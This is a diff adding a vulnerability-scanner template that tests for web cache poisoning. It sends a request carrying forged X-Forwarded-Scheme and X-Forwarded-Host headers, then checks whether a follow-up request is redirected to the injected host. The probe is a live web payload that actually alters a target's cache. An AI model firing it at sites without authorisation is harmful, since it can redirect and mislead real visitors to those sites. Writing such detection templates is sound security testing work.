@@ -1,0 +1,27 @@
+id: cache-poisoning-protocol-host
+
+info:
+  name: Cache Poisoning Protocol and Host
+  author: reewardius
+  severity: high
+  reference: https://youst.in/posts/cache-poisoning-at-scale/
+  tags: cache
+
+http:
+  - raw:
+      - |
+        GET /?{{randstr}}=9 HTTP/1.1
+        x-forwarded-scheme: https
+        x-forwarded-host: iustin.com
+        
+      - |
+        GET /?{{randstr}}=9 HTTP/1.1
+        
+    stop-at-first-match: true
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(header_2, "iustin.com")'
+          - 'status_code_2 == 301 || status_code_2 == 302'
+        condition: and
